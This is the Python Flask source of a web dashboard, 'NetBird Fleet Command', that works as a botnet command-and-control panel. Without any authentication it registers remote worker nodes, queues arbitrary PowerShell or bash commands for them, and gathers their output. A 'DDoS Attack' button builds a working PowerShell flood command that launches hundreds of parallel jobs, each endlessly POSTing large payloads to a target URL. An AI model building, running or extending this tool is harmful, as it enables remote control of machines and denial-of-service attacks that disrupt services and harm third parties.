import json
import os
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string

# ----------------------------------------------------------------------
# Data directory – persistent for the run
# ----------------------------------------------------------------------
DATA_DIR = os.environ.get('WEBAPP_DATA', 'webapp_data')
os.makedirs(DATA_DIR, exist_ok=True)

TASKS_DIR = os.path.join(DATA_DIR, 'tasks')
os.makedirs(TASKS_DIR, exist_ok=True)

RESULTS_FILE = os.path.join(DATA_DIR, 'results.json')
WORKERS_FILE = os.path.join(DATA_DIR, 'workers.json')

# Ensure files exist
for f in [RESULTS_FILE, WORKERS_FILE]:
    if not os.path.exists(f):
        with open(f, 'w') as fp:
            json.dump([], fp)

# Helper: normalize IP (remove /16 suffix if present)
def normalize_ip(ip_str):
    return ip_str.split('/')[0]

# Helper: get path to a worker’s task file using normalized IP
def worker_tasks_file(worker_ip):
    safe_ip = normalize_ip(worker_ip).replace('.', '_')
    return os.path.join(TASKS_DIR, f'tasks_{safe_ip}.json')

def ensure_worker_tasks_file(worker_ip):
    path = worker_tasks_file(worker_ip)
    if not os.path.exists(path):
        with open(path, 'w') as f:
            json.dump([], f)
    return path

# ----------------------------------------------------------------------
# HTML Template (with Stop Attack button and working clear telemetry)
# ----------------------------------------------------------------------
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NetBird Fleet Command</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    colors: {
                        gray: { 850: '#1f2937', 900: '#111827', 950: '#0a0f18' },
                        emerald: { 400: '#34d399', 500: '#10b981', 600: '#059669' },
                        cyan: { 400: '#22d3ee', 500: '#06b6d4' }
                    },
                    fontFamily: {
                        sans:['Inter', 'system-ui', 'sans-serif'],
                        mono: ['Fira Code', 'ui-monospace', 'monospace']
                    }
                }
            }
        }
    </script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: rgba(17, 24, 39, 0.5); border-radius: 4px;}
        ::-webkit-scrollbar-thumb { background: #374151; border-radius: 4px; border: 2px solid #111827; }
        ::-webkit-scrollbar-thumb:hover { background: #4b5563; }
        
        .glass-panel {
            background: linear-gradient(145deg, rgba(17, 24, 39, 0.9), rgba(10, 15, 24, 0.95));
            backdrop-filter: blur(12px);
            border: 1px solid rgba(55, 65, 81, 0.6);
            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
        }
        
        .terminal-input-wrapper {
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.5);
        }

        .worker-card {
            transition: all 0.2s ease-in-out;
        }
        .worker-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
        }
        
        /* Smooth auto-scroll behavior */
        #resultsList { scroll-behavior: smooth; }
    </style>
</head>
<body class="bg-gray-950 text-gray-200 font-sans min-h-screen flex flex-col p-4 md:p-8 bg-[url('https://www.transparenttextures.com/patterns/stardust.png')]">

    <!-- Toast Notifications -->
    <div id="toast-container" class="fixed bottom-5 right-5 z-50 flex flex-col gap-2"></div>

    <!-- Header -->
    <header class="flex flex-col md:flex-row items-start md:items-center justify-between mb-8 pb-5 border-b border-gray-800/80 gap-4">
        <div class="flex items-center gap-4">
            <div class="p-3 bg-gradient-to-br from-emerald-500/20 to-cyan-500/10 rounded-xl border border-emerald-500/30 shadow-[0_0_15px_rgba(16,185,129,0.2)]">
                <i data-lucide="satellite" class="w-7 h-7 text-emerald-400"></i>
            </div>
            <div>
                <h1 class="text-3xl font-bold text-white tracking-tight flex items-center gap-2">
                    Fleet Command 
                </h1>
                <p class="text-xs text-cyan-400/80 font-mono mt-1 flex items-center gap-2">
                    <i data-lucide="shield-check" class="w-3 h-3"></i> SECURE LINK ESTABLISHED // v2.3
                </p>
            </div>
        </div>
        <div class="flex items-center gap-3 px-4 py-2 glass-panel rounded-full text-sm font-mono text-gray-300">
            <span class="w-2.5 h-2.5 rounded-full bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.8)] animate-pulse"></span>
            NETWORK ONLINE
        </div>
    </header>

    <div class="grid grid-cols-1 lg:grid-cols-12 gap-6 flex-grow">
        
        <!-- LEFT COLUMN -->
        <div class="lg:col-span-5 flex flex-col gap-6">
            
            <!-- Command Execution -->
            <div class="glass-panel rounded-2xl p-6 relative overflow-hidden">
                <div class="absolute top-0 right-0 w-32 h-32 bg-emerald-500/5 rounded-full blur-3xl -mr-10 -mt-10"></div>
                <h2 class="text-sm font-bold text-gray-300 uppercase tracking-widest mb-5 flex items-center gap-2">
                    <i data-lucide="terminal-square" class="w-4 h-4 text-emerald-400"></i> Execute Payload
                </h2>
                
                <div class="flex flex-col gap-4">
                    <!-- Existing command input + send button -->
                    <div class="flex bg-gray-950 terminal-input-wrapper border border-gray-700 rounded-xl overflow-hidden focus-within:border-emerald-500 focus-within:ring-1 focus-within:ring-emerald-500 transition-all">
                        <span class="px-4 py-3.5 text-emerald-500 font-mono border-r border-gray-800 bg-gray-900 flex items-center">
                            <i data-lucide="chevron-right" class="w-4 h-4"></i>
                        </span>
                        <input type="text" id="commandInput" placeholder="Enter powershell/bash command..." 
                            class="w-full bg-transparent text-gray-100 font-mono px-4 py-3 outline-none placeholder-gray-600 text-sm" autocomplete="off" autofocus>
                        <button id="sendBtn" class="bg-gradient-to-r from-emerald-600 to-emerald-500 hover:from-emerald-500 hover:to-emerald-400 text-white px-5 font-semibold transition-all flex items-center gap-2 shadow-lg">
                            Deploy <i data-lucide="send" class="w-4 h-4"></i>
                        </button>
                    </div>
                    
                    <!-- Action Buttons Row: DDoS Attack + Stop Attack -->
                    <div class="grid grid-cols-2 gap-3">
                        <button id="ddosBtn" class="bg-gradient-to-r from-red-600/80 to-red-700/80 hover:from-red-600 hover:to-red-700 text-white py-3 rounded-xl font-bold tracking-wide flex items-center justify-center gap-3 shadow-lg border border-red-500/30 transition-all">
                            <i data-lucide="zap" class="w-5 h-5"></i> DDoS Attack
                        </button>
                        <button id="stopBtn" class="bg-gradient-to-r from-yellow-600/80 to-yellow-700/80 hover:from-yellow-600 hover:to-yellow-700 text-white py-3 rounded-xl font-bold tracking-wide flex items-center justify-center gap-3 shadow-lg border border-yellow-500/30 transition-all">
                            <i data-lucide="octagon-x" class="w-5 h-5"></i> Stop Attack
                        </button>
                    </div>
                    
                    <div class="text-[10px] text-gray-500 text-center font-mono">
                        → Attack commands are sent to <span id="currentTargetIndicator" class="text-emerald-400">all nodes</span>
                    </div>
                </div>
                
                <div class="mt-5">
                    <h3 class="text-[10px] text-gray-500 font-mono mb-2 tracking-widest uppercase">Recent Deployments</h3>
                    <div id="commandHistory" class="flex flex-col gap-2 font-mono text-xs">
                        <div class="text-gray-600 italic px-2 py-1">No commands sent in this session.</div>
                    </div>
                </div>
            </div>

            <!-- Active Nodes List -->
            <div class="glass-panel rounded-2xl p-6 flex-grow flex flex-col max-h-[500px]">
                <div class="flex justify-between items-center mb-5">
                    <h2 class="text-sm font-bold text-gray-300 uppercase tracking-widest flex items-center gap-2">
                        <i data-lucide="network" class="w-4 h-4 text-cyan-400"></i> Active Nodes
                    </h2>
                    <span id="workerCount" class="bg-cyan-500/10 text-cyan-400 font-mono text-xs px-2.5 py-1 rounded-md border border-cyan-500/30">0</span>
                </div>
                
                <div id="workersList" class="flex flex-col gap-3 overflow-y-auto pr-2 flex-grow">
                    <!-- Skeleton Loader -->
                    <div class="animate-pulse flex gap-3 items-center p-3">
                        <div class="w-10 h-10 bg-gray-800 rounded-lg"></div>
                        <div class="flex-1 space-y-2">
                            <div class="h-3 bg-gray-800 rounded w-1/2"></div>
                            <div class="h-2 bg-gray-800 rounded w-1/3"></div>
                        </div>
                    </div>
                </div>
                
                <div class="mt-4 pt-4 border-t border-gray-800 text-xs text-gray-400 flex justify-between items-center bg-gray-900/50 p-3 rounded-lg">
                    <div class="flex items-center gap-2">
                        <i data-lucide="crosshair" class="w-4 h-4 text-emerald-500"></i>
                        <span>Target: <span id="currentTarget" class="font-mono text-emerald-400 font-bold bg-emerald-500/10 px-1.5 py-0.5 rounded">all</span></span>
                    </div>
                    <button id="resetTarget" class="text-gray-500 hover:text-white transition-colors bg-gray-800 hover:bg-gray-700 px-2 py-1 rounded">Reset</button>
                </div>
            </div>
        </div>

        <!-- RIGHT COLUMN -->
        <div class="lg:col-span-7 flex flex-col gap-6">
            
            <!-- Pending Queue -->
            <div class="glass-panel rounded-2xl p-6">
                <h2 class="text-sm font-bold text-gray-300 uppercase tracking-widest mb-4 flex items-center gap-2">
                    <i data-lucide="list-todo" class="w-4 h-4 text-purple-400"></i> Pending Queue
                </h2>
                <div id="tasksList" class="space-y-2 font-mono text-sm max-h-[160px] overflow-y-auto pr-2">
                    <div class="text-gray-600 italic py-2">Queue is currently empty.</div>
                </div>
            </div>

            <!-- Telemetry Output -->
            <div class="glass-panel rounded-2xl p-0 flex flex-col flex-grow overflow-hidden relative">
                <div class="bg-gray-900/90 border-b border-gray-800 px-5 py-3 flex justify-between items-center">
                    <h2 class="text-sm font-bold text-gray-300 uppercase tracking-widest flex items-center gap-2">
                        <i data-lucide="activity" class="w-4 h-4 text-emerald-400"></i> Live Telemetry
                    </h2>
                    <div class="flex items-center gap-4">
                        <button id="clearTelemetryBtn" class="text-xs text-gray-500 hover:text-red-400 transition-colors flex items-center gap-1 font-mono">
                            <i data-lucide="trash-2" class="w-3 h-3"></i> Clear Telemetry
                        </button>
                        <div class="flex gap-1.5">
                            <div class="w-3 h-3 rounded-full bg-red-500/50"></div>
                            <div class="w-3 h-3 rounded-full bg-yellow-500/50"></div>
                            <div class="w-3 h-3 rounded-full bg-emerald-500/50"></div>
                        </div>
                    </div>
                </div>
                <div id="resultsList" class="p-5 bg-gray-950 text-gray-300 font-mono text-sm overflow-y-auto flex-grow max-h-[450px] space-y-4">
                    <div class="text-gray-600 italic py-2">Awaiting telemetry data...</div>
                </div>
            </div>
            
        </div>
    </div>

    <script>
        // Initialize Icons
        lucide.createIcons();
        
        let history =[];
        let selectedTarget = 'all';

        const escapeHTML = (str) => {
            if (!str) return '';
            return str.toString()
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
        };

        // FIXED TIME AGO FUNCTION
        const timeAgo = (dateStr) => {
            const str = dateStr.endsWith('Z') ? dateStr : dateStr + 'Z';
            const then = new Date(str).getTime();
            const seconds = Math.floor((Date.now() - then) / 1000);
            
            if (seconds < 5) return "Just now";
            if (seconds < 60) return `${seconds}s ago`;
            if (seconds < 3600) return Math.floor(seconds / 60) + "m ago";
            if (seconds < 86400) return Math.floor(seconds / 3600) + "h ago";
            return Math.floor(seconds / 86400) + "d ago";
        };

        const showToast = (message, type = 'success') => {
            const container = document.getElementById('toast-container');
            const toast = document.createElement('div');
            
            const styles = type === 'success' 
                ? 'bg-emerald-500/10 border-emerald-500/40 text-emerald-400 shadow-[0_0_15px_rgba(16,185,129,0.2)]' 
                : 'bg-red-500/10 border-red-500/40 text-red-400 shadow-[0_0_15px_rgba(239,68,68,0.2)]';
                
            toast.className = `px-5 py-3.5 rounded-xl border ${styles} backdrop-blur-md font-mono text-sm flex items-center gap-3 transition-all duration-300 translate-y-10 opacity-0`;
            toast.innerHTML = `<i data-lucide="${type === 'success' ? 'check-circle-2' : 'alert-octagon'}" class="w-5 h-5"></i> ${message}`;
            
            container.appendChild(toast);
            lucide.createIcons();
            
            setTimeout(() => { toast.classList.remove('translate-y-10', 'opacity-0'); }, 10);
            setTimeout(() => {
                toast.classList.add('opacity-0', 'translate-y-5');
                setTimeout(() => toast.remove(), 300);
            }, 4000);
        };

        async function updateData() {
            try {
                const [tasksRes, resultsRes, workersRes] = await Promise.all([
                    fetch('/api/tasks'), fetch('/api/results'), fetch('/api/workers')
                ]);
                const tasks = await tasksRes.json();
                const results = await resultsRes.json();
                const workers = await workersRes.json();

                // UPDATE TASKS
                const tasksContainer = document.getElementById('tasksList');
                if (tasks.length === 0) {
                    tasksContainer.innerHTML = '<div class="text-gray-600 italic py-2">Queue is empty.</div>';
                } else {
                    tasksContainer.innerHTML = tasks.map(t => `
                        <div class="flex items-center gap-3 bg-gray-900/60 p-2.5 rounded-lg border border-gray-800 hover:border-gray-700 transition-colors">
                            <span class="text-purple-400 font-bold bg-purple-500/10 px-2 py-0.5 rounded text-xs min-w-[35px] text-center">#${t.id}</span>
                            <span class="text-gray-300 truncate font-semibold">${escapeHTML(t.command)}</span>
                            <span class="text-[11px] text-gray-500 ml-auto border border-gray-800 px-2 py-0.5 rounded bg-gray-950">
                                target: <span class="${t.target === 'all' ? 'text-emerald-400' : 'text-cyan-400'}">${escapeHTML(t.target)}</span>
                            </span>
                        </div>
                    `).reverse().join('');
                }

                // UPDATE RESULTS
                const resultsContainer = document.getElementById('resultsList');
                const wasScrolledToBottom = resultsContainer.scrollHeight - resultsContainer.clientHeight <= resultsContainer.scrollTop + 20;
                
                if (results.length > 0) {
                    resultsContainer.innerHTML = results.map(r => {
                        const output = r.output || r.result || JSON.stringify(r);
                        return `
                        <div class="border-l-2 border-emerald-500/40 pl-4 mb-5 relative group">
                            <div class="absolute -left-[9px] top-1.5 w-4 h-4 bg-gray-950 rounded-full border border-emerald-500/40 group-hover:bg-emerald-500/20 transition-colors"></div>
                            <div class="flex justify-between items-center mb-2 text-xs">
                                <span class="text-emerald-400 font-bold bg-emerald-500/10 px-2 py-0.5 rounded">Node: ${escapeHTML(r.worker || r.ip || r.hostname || 'Unknown')}</span>
                                <span class="text-gray-500 bg-gray-900 px-2 py-0.5 rounded">Task #${escapeHTML(r.id || '?')}</span>
                            </div>
                            <div class="text-gray-300 whitespace-pre-wrap break-all bg-gray-900/40 p-3 rounded border border-gray-800/50">${escapeHTML(output)}</div>
                        </div>
                    `}).reverse().join('');
                } else {
                    resultsContainer.innerHTML = '<div class="text-gray-600 italic py-2">Telemetry cleared. Awaiting new data...</div>';
                }
                if (wasScrolledToBottom) resultsContainer.scrollTop = resultsContainer.scrollHeight;

                // UPDATE WORKERS
                const workersContainer = document.getElementById('workersList');
                document.getElementById('workerCount').innerText = workers.length;
                
                if (workers.length === 0) {
                    workersContainer.innerHTML = '<div class="text-gray-500 italic text-sm py-2">No nodes connected.</div>';
                } else {
                    workersContainer.innerHTML = workers.map(w => {
                        const lastSeenStr = w.lastSeen.endsWith('Z') ? w.lastSeen : w.lastSeen + 'Z';
                        const lastSeenDate = new Date(lastSeenStr);
                        const isOnline = ((Date.now() - lastSeenDate.getTime()) / 60000) < 5;
                        
                        const isSelected = selectedTarget === w.ip;
                        const cardBorder = isSelected ? 'border-emerald-500 ring-1 ring-emerald-500/50 shadow-[0_0_10px_rgba(16,185,129,0.2)]' : 'border-gray-800';
                        
                        return `
                        <div class="worker-card bg-gray-900/50 border ${cardBorder} p-3.5 rounded-xl flex items-center justify-between cursor-pointer" data-ip="${escapeHTML(w.ip)}">
                            <div class="flex flex-col">
                                <span class="font-bold text-gray-200 text-sm flex items-center gap-2">
                                    <i data-lucide="server" class="w-4 h-4 ${isOnline ? 'text-emerald-400' : 'text-gray-500'}"></i> 
                                    ${escapeHTML(w.hostname || w.name || w.ip || 'Unknown Node')}
                                </span>
                                <span class="text-xs text-gray-500 mt-1 font-mono">${escapeHTML(w.ip)} • <span class="text-cyan-500/70">${escapeHTML(w.os || 'N/A')}</span></span>
                            </div>
                            <div class="flex flex-col items-end">
                                <span class="flex items-center gap-1.5 text-[11px] font-bold tracking-wider ${isOnline ? 'text-emerald-400 bg-emerald-500/10' : 'text-red-400 bg-red-500/10'} px-2 py-0.5 rounded">
                                    <span class="w-2 h-2 rounded-full ${isOnline ? 'bg-emerald-500 animate-pulse' : 'bg-red-500'}"></span>
                                    ${isOnline ? 'ONLINE' : 'OFFLINE'}
                                </span>
                                <span class="text-[10px] text-gray-500 mt-1.5 font-mono">${timeAgo(w.lastSeen)}</span>
                            </div>
                        </div>
                    `}).join('');
                    
                    lucide.createIcons();
                    
                    // Attach click handlers to cards
                    document.querySelectorAll('.worker-card').forEach(card => {
                        card.addEventListener('click', (e) => {
                            e.stopPropagation();
                            const ip = card.getAttribute('data-ip');
                            selectedTarget = ip;
                            document.getElementById('currentTarget').innerText = ip;
                            document.getElementById('currentTargetIndicator').innerText = ip;
                            // Update UI immediately for click responsiveness
                            document.querySelectorAll('.worker-card').forEach(c => {
                                c.classList.remove('border-emerald-500', 'ring-1', 'ring-emerald-500/50', 'shadow-[0_0_10px_rgba(16,185,129,0.2)]');
                                c.classList.add('border-gray-800');
                            });
                            card.classList.remove('border-gray-800');
                            card.classList.add('border-emerald-500', 'ring-1', 'ring-emerald-500/50', 'shadow-[0_0_10px_rgba(16,185,129,0.2)]');
                        });
                    });
                }
            } catch (err) {
                console.error("Polling error:", err);
            }
        }

        setInterval(updateData, 3000);
        updateData();

        document.getElementById('resetTarget').addEventListener('click', () => {
            selectedTarget = 'all';
            document.getElementById('currentTarget').innerText = 'all';
            document.getElementById('currentTargetIndicator').innerText = 'all nodes';
            updateData(); // Refresh UI to remove borders
        });

        const cmdInput = document.getElementById('commandInput');
        const sendBtn = document.getElementById('sendBtn');
        const historyDiv = document.getElementById('commandHistory');

        const executeCommand = async () => {
            const cmd = cmdInput.value.trim();
            if (!cmd) return;
            cmdInput.disabled = true;
            sendBtn.innerHTML = `<i data-lucide="loader-2" class="w-4 h-4 animate-spin"></i> Deploying`;
            lucide.createIcons();

            try {
                const res = await fetch('/api/tasks', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: cmd, target: selectedTarget})
                });

                if(res.ok) {
                    showToast(`Payload deployed to ${selectedTarget === 'all' ? 'all nodes' : selectedTarget}.`, 'success');
                    history.unshift(cmd);
                    if (history.length > 5) history.pop();
                    historyDiv.innerHTML = history.map((c, idx) => `
                        <div class="bg-gray-900/80 px-3 py-1.5 rounded border border-gray-800 flex items-center gap-2 ${idx === 0 ? 'text-emerald-400' : 'text-gray-400'}">
                            <span class="opacity-50 text-xs">❯</span> ${escapeHTML(c)}
                        </div>
                    `).join('');
                    cmdInput.value = '';
                } else {
                    showToast('Failed to deploy payload.', 'error');
                }
            } catch (e) {
                showToast('Network link failure.', 'error');
            }

            cmdInput.disabled = false;
            sendBtn.innerHTML = `Deploy <i data-lucide="send" class="w-4 h-4"></i>`;
            lucide.createIcons();
            cmdInput.focus();
            updateData();
        };

        // DDoS Attack function
        const ddosAttack = () => {
            let target = prompt("Enter target URL (e.g., http://100.90.236.221:5000/):", "http://");
            if (!target) return;
            let payloadSize = prompt("Payload size in MB (default 1):", "1");
            if (payloadSize === null) return;
            payloadSize = parseInt(payloadSize) || 1;
            let jobs = prompt("Number of parallel jobs (default 500):", "500");
            if (jobs === null) return;
            jobs = parseInt(jobs) || 500;
            
            const cmd = `$p="A"*(${payloadSize}*1MB); 1..${jobs}|%{Start-Job -ScriptBlock{while(1){try{Invoke-WebRequest -Uri '${target}' -Method POST -Body $using:p -UseBasicParsing -TimeoutSec 5}catch{}}}}`;
            cmdInput.value = cmd;
            executeCommand();
        };

        // Stop Attack function
        const stopAttack = () => {
            const cmd = 'Get-Job | Stop-Job; Get-Job | Remove-Job';
            cmdInput.value = cmd;
            executeCommand();
        };

        // Clear Telemetry function (server‑side)
        const clearTelemetry = async () => {
            try {
                const res = await fetch('/api/results/clear', { method: 'POST' });
                if (res.ok) {
                    showToast('Telemetry cleared from server.', 'success');
                    updateData(); // refresh results list immediately
                } else {
                    showToast('Failed to clear telemetry.', 'error');
                }
            } catch (e) {
                showToast('Network error while clearing telemetry.', 'error');
            }
        };

        sendBtn.onclick = executeCommand;
        cmdInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') executeCommand();
        });
        
        document.getElementById('ddosBtn').addEventListener('click', ddosAttack);
        document.getElementById('stopBtn').addEventListener('click', stopAttack);
        document.getElementById('clearTelemetryBtn').addEventListener('click', clearTelemetry);
        
        // Update target indicator when selectedTarget changes
        const updateTargetIndicator = () => {
            document.getElementById('currentTargetIndicator').innerText = selectedTarget === 'all' ? 'all nodes' : selectedTarget;
        };
        // Call it after any target change
        const origCardClick = document.querySelectorAll('.worker-card').forEach(c => c.onclick);
        // Override reset target to also update indicator
        const resetBtn = document.getElementById('resetTarget');
        const originalResetHandler = resetBtn.onclick;
        resetBtn.onclick = () => {
            selectedTarget = 'all';
            document.getElementById('currentTarget').innerText = 'all';
            updateTargetIndicator();
            updateData();
        };
        // Update indicator after card click (already set inside card click, but we need to call updateTargetIndicator there)
        // We'll add a global function to update after any selection.
        // Already calling updateTargetIndicator inside card click and reset; we just need to make sure it's called.
        // Add a setter for selectedTarget? Not needed.
        window.updateTargetIndicator = updateTargetIndicator;
        updateTargetIndicator();
    </script>
</body>
</html>
'''

app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

# ----------------------------------------------------------------------
# API endpoints
# ----------------------------------------------------------------------
@app.route('/api/tasks', methods=['GET'])
def get_tasks():
    all_tasks =[]
    for filename in os.listdir(TASKS_DIR):
        if not filename.startswith('tasks_') or not filename.endswith('.json'):
            continue
        with open(os.path.join(TASKS_DIR, filename), 'r') as f:
            tasks = json.load(f)
            all_tasks.extend(tasks)
    for idx, t in enumerate(all_tasks):
        t['display_id'] = idx + 1
    return jsonify(all_tasks)

@app.route('/api/tasks', methods=['POST'])
def add_task():
    data = request.json
    if not data or 'command' not in data:
        return 'Missing command', 400
    target = data.get('target', 'all')

    if target == 'all':
        with open(WORKERS_FILE, 'r') as f:
            workers = json.load(f)
        if not workers:
            return 'No workers registered', 400
        for worker in workers:
            ip = worker['ip']
            ip_clean = normalize_ip(ip)
            ensure_worker_tasks_file(ip_clean)
            path = worker_tasks_file(ip_clean)
            with open(path, 'r+') as f:
                tasks = json.load(f)
                tasks.append({'id': len(tasks)+1, 'command': data['command'], 'target': 'all'})
                f.seek(0)
                json.dump(tasks, f, indent=2)
                f.truncate()
        return 'OK', 200
    else:
        target_clean = normalize_ip(target)
        ensure_worker_tasks_file(target_clean)
        path = worker_tasks_file(target_clean)
        with open(path, 'r+') as f:
            tasks = json.load(f)
            tasks.append({'id': len(tasks)+1, 'command': data['command'], 'target': target})
            f.seek(0)
            json.dump(tasks, f, indent=2)
            f.truncate()
        return 'OK', 200

@app.route('/api/tasks/pop', methods=['GET'])
def pop_task():
    worker = request.args.get('worker')
    if not worker:
        return '', 400
    worker_clean = normalize_ip(worker)
    ensure_worker_tasks_file(worker_clean)
    path = worker_tasks_file(worker_clean)
    with open(path, 'r+') as f:
        tasks = json.load(f)
        if tasks:
            task = tasks.pop(0)
            f.seek(0)
            json.dump(tasks, f, indent=2)
            f.truncate()
            return jsonify(task)
    return '', 204

@app.route('/api/results', methods=['POST'])
def add_result():
    with open(RESULTS_FILE, 'r+') as f:
        results = json.load(f)
        results.append(request.json)
        f.seek(0)
        json.dump(results, f, indent=2)
        f.truncate()
    return 'OK', 200

@app.route('/api/results', methods=['GET'])
def get_results():
    with open(RESULTS_FILE, 'r') as f:
        return jsonify(json.load(f))

@app.route('/api/results/clear', methods=['POST'])
def clear_results():
    """Clear all results by overwriting the results file with an empty list."""
    with open(RESULTS_FILE, 'w') as f:
        json.dump([], f)
    return 'OK', 200

@app.route('/api/workers', methods=['POST'])
def register_worker():
    data = request.json
    if not data:
        return 'Missing data', 400
    if 'ip' in data:
        data['ip'] = normalize_ip(data['ip'])
    
    data['lastSeen'] = datetime.utcnow().isoformat() + 'Z'
    
    with open(WORKERS_FILE, 'r+') as f:
        workers = json.load(f)
        existing = next((w for w in workers if w.get('ip') == data.get('ip')), None)
        if existing:
            existing.update(data)
        else:
            workers.append(data)
        f.seek(0)
        json.dump(workers, f, indent=2)
        f.truncate()
        
    ensure_worker_tasks_file(data['ip'])
    return 'OK', 200

@app.route('/api/workers', methods=['GET'])
def get_workers():
    with open(WORKERS_FILE, 'r') as f:
        return jsonify(json.load(f))

if __name__ == '__main__':
    print("Dashboard started on http://127.0.0.1:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)
